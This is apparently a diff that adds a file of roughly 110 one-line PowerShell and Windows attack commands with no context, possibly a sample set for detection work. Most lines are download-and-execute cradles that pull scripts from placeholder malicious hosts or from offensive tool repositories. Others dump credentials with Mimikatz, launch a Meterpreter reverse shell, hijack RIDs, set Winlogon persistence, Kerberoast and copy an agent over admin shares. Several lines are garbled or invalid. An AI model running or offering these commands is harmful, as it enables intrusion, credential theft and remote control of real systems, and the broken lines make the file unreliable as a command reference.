@@ -1,0 +1,113 @@
+Invoke-RIDHijacking -UseGuest -RID 1001 -Password Password1
+Import-Module ${PSmodule} ; Invoke-DNSReverse -i ${PSmodule} -d ${Domain} -p ${pwd} -doh ${DOH} -t ${Time} ${Encoding}
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File bad_script.ps1
+Invoke-CompiledHTML -StorageHandler ${hh_file_path} -HHFilePath ${hh_file_path} -CHMFilePath ${chm_file_path}
+Invoke-BackdoorLNK -Path C:\Users\Public\sandcat.lnk -Pattern '*0*' -CaseSensitive
+Get-EventLog -LogName "system" -MaxEvents 1000
+& "${PsExec_Path}" ${tr_session} "${pwd_path}"
+Invoke-CredentialPhisting -DomainName 'demo' -UserName 'administrator' -Password 'Password1'
+temp\file.txt | Out-File -FilePath .\temp\file.txt
+powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc <malicious_payload.exe>
+Invoke-Command -ComputerName <RemoteComputerName> -ScriptBlock {Start-Process cmd.exe -ArgumentList "/c <command>"}
+Invoke-Expression -Command "IEX (New-Object Net.WebClient).DownloadString('http://hack.site.com/code.ps1')"
+Start-WebcamRecorder -RecordTime 10 -Path ${v_path}
+$url = "http://malicious.site.com/malicious.ps1";Invoke-Expression (New-Object System.Net.WebClient).DownloadString($url)
+Import-Module .\adfs.ps1; ; Export-Module .\adfs.ps1
+powershell.exe -encodedcommand <base64 encoded command>
+Invoke-Expression -Command 'IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1")'
+Get-ChildItem ${file_path} | % { $_.ChildName } | ConvertTo-Json -Depth 1
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://example.com/script.ps1')"
+Exploit-Jenkins -Rhost 127.0.0.1 -Port 8080 -Cmd 'whoami'
+Invoke-Command -ComputerName <target_host> -ScriptBlock { < code > }
+Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat" -OutFile ${output_file}
+powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Invoke-Mimikatz"
+Get-WmiObject -Class Win32_Process | Export-Csv c:\temp\results.csv -NoTypeInformation
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5775/WinPwn.ps1')"
+Invoke-Command -ComputerName <remote_system_name> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('<host_to_delete>')}
+Invoke-Expression -Command "IEX (New-Object Net.WebClient).DownloadString('http://hack.site.com/code.ps1')"
+Invoke-ATHHTMLApplication -ScriptEngine ${script_engine} -AsLocalUNCPath -SimulateUserDoubleClick -MSHTAFilePath ${mshta_file_path}
+url http://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat" ; & "${local_folder}${local_executable}" kerberoast ${flags} /outfile:"${local_folder}${out_file}"
+Invoke-RIDHijacking -User alice -RID 500
+$psbypass = New-Object System.Net.WebClient; $psbypass.DownloadString('http://malicious-site.com/malicious-script.ps1')
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious-url')"
+powershell.exe -ExecutionPolicy Bypass -File C:\script.ps1
+powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Invoke-Mimikatz"
+Invoke-Expression -Command 'IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1")'
+cd $env:temp ; .\kerbrute.exe bruteuser --dc ${DomainController} -d ${Domain} $env:temp\bruteUser.txt TestUser10
+powershell.exe -ExecutionPolicy Bypass -File C:\script.ps1
+Invoke-NinjaCopy -Path 'C:\windows;tds;tds.dit' -RemoteDestination 'c:\windows\temp;tds.dit' -ComputerName 'Server1'
+Invoke-Mimikatz -DumpCreds; Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.1 -Lport 443
+Start-Process ${n_exe_path} ; Start-Sleep -Second 5 ; Stop-Process -Name "CMD"
+Invoke-Command -ComputerName <RemoteComputerName> -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('<malicious-script.ps1')}
+Invoke-Expression -Command "IEX (New-Object Net.WebClient).DownloadString('http://hack.site.com/code.ps1')"
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -Command "& {Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://maliciousurl.com/malicious.ps1')}"
+Get-BrowserInformation -Browser All -Datatype History -UserName Alice -SearchStrings 'twitter'
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File bad_script.ps1
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -Command "& {Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://maliciousurl.com/malicious.ps1')}"
+powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/malware/kernF1.ps1')"
+dir ${git_dir} -Recurse | Compress-Archive -DestinationPath ${output_path}
+Get-Content ${input_file} -Encoding Byte -ReadCount 1024 | format-list path,title,episodeName,programDescription
+powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')"
+netsh interface portproxy add v4tov4 listenport=${listenport} connectport=${connectport} address=${address}
+$env:COR_ENABLE_PROFILING = 1 ; $env:COR_PROFILER = '${clsid_guid}' ; $env:COR_PROFILER_PATH = '${file_name}' ; POWERSHELL -c 'Start-Process'
+Invoke-RIDHijacking -User Joe -RID 500 -Password Password1 -Enable
+get-wmiObject -class Win32_Group
+Get-Date -Format ${CurrentDate}
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File ${script_path}
+powershell.exe -ExecutionPolicy Bypass -File C:\script.ps1
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'http://malicious-url.com/malicious-payload.ps1' | Invoke-Expression"
+$payload = [System.Text.Encoding]::Unicode.GetBytes("Invoke-Mimikatz -DumpCreds")
+Invoke-TokenManipulation -CreateProcess 'cmd.exe' -ThreadId 323
+Invoke-Inveigh -Command 'net user Inveigh Spring2017 /add && net local network Inveigh /add'
+Invoke-Expression -Command "& {host-ip}"
+powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Invoke-Mimikatz"
+start (Get-Process -Id 6742) ; start (Get-Process -Id 6742) ; stop (Get-Process -Id 6742)
+Start-Process ${WebBrowserPassViewPath} ; Start-Sleep -Second 3 ; Stop-Process -Name "WebBrowserPassView"
+Invoke-CompiledHelp -ScriptEngine ${script_engine} -InfoTechStorageHandler ${infotech_storage_handler} -TopicExtension ${topic_extension} -HHFilePath ${hh_file_path} -CHMFilePath ${chm_file_path}
+$ElevatedOptions = New-ElevatedPersistenceOption -Registry -AtStartup
+Invoke-Expression -Command "IEX (New-Object Net.WebClient).DownloadString('http://heavy.site.com/heavy_code.ps1')"
+get-wmiObject -class Win32_UserAccount
+Invoke-Mimikatz -DumpCreds; Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.1 -Lport 443
+Get-IndexedItem -filter stingray -path ([system.environment]::GetFolderPath( [system.environment+specialFolder]::MyFolder )) -recurse
+Set-LoggedOnLocal -LogonType ${script_log_type} -Verbose
+Invoke-Shellcode -Shellcode @(0xC7,0xE9)
+powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://exploitingurl.com/exeKern32.ps1')"
+Invoke-ATHHTMLApplication -UseLogo -NonInteractive -FilePath ${file_path}
+Invoke-XMLPayload -Path ${file_path} -XMLPayload ${xml_payload}
+powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest http://www.somewhere.com/hello.ps1 -OutFile hello.ps1; .\hello.ps1"
+Invoke-NetResource -ComputerName <remote_host> -Verbose
+Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, ${bin_to_execute}" -Force
+Invoke-Command -ComputerName <target> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/sysRoot.ps1')}
+Get-ChildItem -Path ${folder} -Recurse | % { $_.Content }
+Certify.exe download /ca:dc.theshire.local\theshire-DC-CA /id:336
+Invoke-CimMethod -ClassName Win32_Product -MethodName ${action} -Arguments @{ PackageLocation = '${MSIPayload}' }
+Invoke-ExecuteMSBuild -ComputerName 'testvm.test.org' -UserName 'Test.org\Joe' -Password 'Password123!'
+Get-Process wininit | Invoke-TokenManipulation -CreateProcess 'cmd.exe' -PassThru
+Get-Domain | select Forest , Domain , IPAddress , Name , OSVersion | fl
+Invoke-Krbtgt hash / childdomain:sub.domain.local /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap
+gci HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters -Name 'password' -Value '*$'
+Get-PSSession -Name 'Session1'
+$o = 'Get'; $b = 'Process'; $cmd = $o + '-' + $b; Invoke-Expression $cmd
+nbtstat -A ${remote.host.fqdn} -D ${local.user.name} -p ${local.user.password}
+$function = 'Get-Process'; Set-Alias -Name $function -Value Get-Process
+Rubeus.exe asktgs /service:cifs /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap
+Invoke-SQLServerLinkCrawl -InstanceName 'dcorp-mssql' -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'
+Get-DomainGPOLocalGroup | select GPODisplayName , ContainerName , ComputerName
+$path = 'Get-Keystrokes'; Get-ChildItem -Path $path -Recurse | Out-File -FilePath $path
+netsh interface portproxy add v4tov4 listenport=${listenport} connectport=${connectport} connectaddress=${connectaddress}
+gci c:\ -Include *.config,*.conf,*.xml -File -Recurse -EA SilentlyContinue | Select-String -Pattern "password"
+Get-NetShare -Name "RDPUsers" -Force
+C:\Windows\System32\inetsrv\appcmd.exe list /host:10.10.1.0 /domain:subnet /dontHost:true
+Rubeus.exe hash /password:asdf
+$imewdbled = New-Object Net.WebClient; $imewdbled.DownloadString('http://malicious-site.com/malicious-code')
+Get-ATHDataStream | Select-Object -Property ProcessName, Id, message.txt
+[System.Security.Principal.WindowsPrincipal]::GetCurrent() | % { $_.Security.Principal.WindowsIdentity]::GetCurrent() }
+$path = "sandcat.go-windows"; ; $drive = "\\${remote.host.fqdn}\C$"; ; Copy-Item -v -Path $path -Destination $drive"\Users\Public\s4ndc4t.exe";
+$script = 'Get-Process'; Invoke-Expression $script;
+(Get-WmiObject -Class "Win32_TerminalServiceSetting" -Namespace root\cimv2\terminalservices).SetAllowTsConnections(1)
+Get-ForestGlobalCatalog -Forest external
+Invoke-UserHunter -CheckState
+$code = 'Get-Process'; Invoke-Expression $code
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://10.9.121.8')"
+(Get-WmiObject -Class "Win32_TerminalServiceSetting" -Namespace root\cimv2\terminalservices).SetAllowTsConnections(1)
+Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose
